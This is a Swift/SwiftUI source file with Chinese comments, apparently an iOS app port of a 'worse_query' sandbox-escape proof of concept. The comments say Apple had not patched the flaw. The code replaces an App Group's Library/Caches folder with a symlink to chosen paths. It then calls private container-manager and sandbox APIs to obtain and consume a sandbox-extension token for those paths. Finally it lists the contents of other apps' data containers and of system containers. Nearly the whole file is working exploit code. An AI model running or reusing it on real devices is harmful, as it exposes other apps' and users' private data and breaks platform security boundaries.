import SwiftUI

// MARK: - worse_query 沙盒逃逸移植（探测版 v0）
// 源自 forcequitOS/worse_query PoC (GPL-3.0, Taj C/forcequit, 2026-11-08)
// 原理：App Group 的 Library/Caches 换成指向任意目标的符号链接，
// 向容器管理器查询组缓存分区，管理器跟链接给目标签发沙盒扩展令牌。
// Apple 未修（截至 2026-11-16），仅供个人研究使用。

enum WQ {
    typealias FNCreate = @convention(c) () -> UnsafeMutableRawPointer?
    typealias FNSetU64 = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    typealias FNSetXPC = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    typealias FNResult = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    typealias FNNop = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FNTok = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    typealias FNConsume = @convention(c) (UnsafePointer<CChar>?) -> Int64
    typealias FNRelease = @convention(c) (Int64) -> Int32
    typealias FNXpcStr = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?

    static let groupID = "group.com.sian.DouyinBox"

    static func restoreCaches(_ group: String) {
        guard let root = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) else { return }
        let caches = root.appendingPathComponent("Library/Caches")
        try? FileManager.default.removeItem(at: caches)
        try? FileManager.default.createDirectory(at: caches, withIntermediateDirectories: false)
    }

    /// 申请 target 的沙盒扩展；返回 >=0 为句柄，<0 为错误码
    static func escape(_ target: String, group: String = groupID, altFlags: Bool = false) -> Int64 {
        var st = stat()
        if lstat(target, &st) != 0 { return -255 }
        guard let groupRoot = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) else { return -1 }
        let caches = groupRoot.appendingPathComponent("Library/Caches").path
        let fm = FileManager.default
        try? fm.createDirectory(atPath: (caches as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try? fm.removeItem(atPath: caches)
        do { try fm.createSymbolicLink(atPath: caches, withDestinationPath: target) } catch { return -4 }

        guard let mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL) else {
            restoreCaches(group); return -2
        }
        defer { dlclose(mgr) }
        guard let pCreate = dlsym(mgr, "container_query_create"),
              let pClass = dlsym(mgr, "container_query_set_class"),
              let pIdent = dlsym(mgr, "container_query_set_group_identifiers"),
              let pFlags = dlsym(mgr, "container_query_operation_set_flags"),
              let pPart = dlsym(mgr, "container_query_operation_set_part"),
              let pRes = dlsym(mgr, "container_query_get_single_result"),
              let pFree = dlsym(mgr, "container_query_free"),
              let pTok = dlsym(mgr, "container_copy_sandbox_token"),
              let sbx = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW | RTLD_LOCAL),
              let pCons = dlsym(sbx, "sandbox_extension_consume"),
              let pRel = dlsym(sbx, "sandbox_extension_release"),
              let xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW | RTLD_LOCAL),
              let pXpc = dlsym(xpcLib, "xpc_string_create") else {
            restoreCaches(group); return -2
        }
        defer { dlclose(sbx); dlclose(xpcLib) }
        let fCreate = unsafeBitCast(pCreate, to: FNCreate.self)
        let fClass = unsafeBitCast(pClass, to: FNSetU64.self)
        let fIdent = unsafeBitCast(pIdent, to: FNSetXPC.self)
        let fFlags = unsafeBitCast(pFlags, to: FNSetU64.self)
        let fPart = unsafeBitCast(pPart, to: FNSetU64.self)
        let fRes = unsafeBitCast(pRes, to: FNResult.self)
        let fFree = unsafeBitCast(pFree, to: FNNop.self)
        let fTok = unsafeBitCast(pTok, to: FNTok.self)
        let fCons = unsafeBitCast(pCons, to: FNConsume.self)
        let fXpc = unsafeBitCast(pXpc, to: FNXpcStr.self)
        _ = pRel // 释放句柄在 release() 里独立解析

        guard let q = fCreate() else { restoreCaches(group); return -3 }
        let ident = group.withCString { cs in fXpc(cs) }
        fClass(q, 7)                                  // class 7 = appGroup
        if let ident { fIdent(q, ident) }
        fPart(q, 3)                                   // part 3 = Library/Caches
        fFlags(q, altFlags ? 0x0000_0008_0000_0000 : 0x0000_0080_0000_0000)

        let res = fRes(q)
        var handle: Int64 = -5
        if let res {
            if let tok = fTok(res) {
                handle = fCons(tok)
                free(tok)
            } else { handle = -6 }
        }
        fFree(q)
        restoreCaches(group)
        return handle
    }

    static func release(_ handle: Int64) {
        guard handle >= 0 else { return }
        typealias FNRel = @convention(c) (Int64) -> Int32
        if let sbx = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW | RTLD_LOCAL),
           let p = dlsym(sbx, "sandbox_extension_release") {
            _ = unsafeBitCast(p, to: FNRel.self)(handle)
            dlclose(sbx)
        }
    }
}

// MARK: - 探测执行器

@MainActor
final class WQProbe: ObservableObject {
    @Published var lines: [String] = []
    @Published var running = false

    private func log(_ s: String) { lines.append(s) }

    func run() {
        guard !running else { return }
        running = true
        lines = []
        Task.detached(priority: .userInitiated) {
            var handles: [Int64] = []
            let t0 = Date()
            await MainActor.run { self.log("=== worse_query 探测 \(Date().description) ===") }

            // 0. App Group 票是否在手
            let gr = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: WQ.groupID)
            await MainActor.run {
                self.log("0) App Group: \(gr == nil ? "✗ 拿不到（签名没带组权限）" : "✓ " + (gr?.path ?? ""))")
            }
            if gr == nil {
                await MainActor.run { self.running = false; self.log("=== 中止：先补组权限 ===") }
                return
            }

            let targets: [(String, String)] = [
                ("/var/mobile/Containers/Data/Application", "1) 全部 App 数据容器"),
                ("/var/mobile/Containers/Shared/AppGroup", "2) App Group 共享区"),
                ("/var/containers/Data/System", "3) 系统容器(iOS27)"),
                ("/var/containers/Shared/SystemGroup", "4) 系统共享组(iOS27)"),
            ]
            for (path, label) in targets {
                var h = WQ.escape(path)
                var tried = ""
                if h < 0 {
                    h = WQ.escape(path, altFlags: true)
                    tried = "（alt 旗标）"
                }
                if h >= 0 { handles.append(h) }
                let err = h
                await MainActor.run { self.log("\(label) → 句柄 \(err) \(err >= 0 ? "✓" : "✗ \(WQE.desc(err))")\(tried)") }
                if h >= 0, path.contains("Data/Application") || path.hasSuffix("AppGroup") {
                    let listing = Self.shallowList(path)
                    await MainActor.run { self.log(listing) }
                }
            }
            handles.forEach { WQ.release($0) }
            await MainActor.run {
                self.log(String(format: "=== 完毕 %.1fs（句柄已释放）===", Date().timeIntervalSince(t0)))
                self.running = false
            }
        }
    }

    nonisolated static func shallowList(_ root: String) -> String {
        let fm = FileManager.default
        guard let subs = try? fm.contentsOfDirectory(atPath: root) else { return "    (扩展到手但列目录失败)" }
        var out = "    共 \(subs.count) 个子项；前 6："
        for s in subs.prefix(6) {
            var st = stat()
            let full = root + "/" + s
            lstat(full, &st)
            let isDir = (st.st_mode & S_IFMT) == S_IFDIR
            out += "\n      " + s.prefix(42).description + (isDir ? "/" : " (\(st.st_size)B)")
        }
        return out
    }
}

enum WQE {
    static func desc(_ c: Int64) -> String {
        switch c {
        case -1: return "无 App Group 容器（组权限缺失）"
        case -2: return "私有 API 解析失败（系统结构变了）"
        case -3: return "查询对象创建失败"
        case -4: return "符号链接创建失败"
        case -5: return "containermanagerd 拒签（关键！多半=已修/不在此版本射程）"
        case -6: return "内核不发令牌"
        case -255: return "目标路径 lstat 不可见（先逃父目录再说）"
        default: return "错误 \(c)"
        }
    }
}

// MARK: - 界面

struct WQProbeView: View {
    @StateObject private var probe = WQProbe()
    var body: some View {
        List {
            Section {
                Text("PoC 移植自 forcequitOS/worse_query（GPL-3.0）。探测只申请→读目录→放还，不写任何别人的文件。你的 iOS 版本是否修复以结果为准。")
                    .font(.footnote).foregroundStyle(.secondary)
                Button(probe.running ? "探测中…" : "开始探测") { probe.run() }
                    .disabled(probe.running)
            }
            if !probe.lines.isEmpty {
                Section("结果") {
                    ForEach(Array(probe.lines.enumerated()), id: \.offset) { _, l in
                        Text(l).font(.system(.caption, design: .monospaced))
                    }
                }
            }
        }
        .navigationTitle("上帝视野探针")
        .navigationBarTitleDisplayMode(.inline)
        .toolbar(.hidden, for: .tabBar)
    }
}
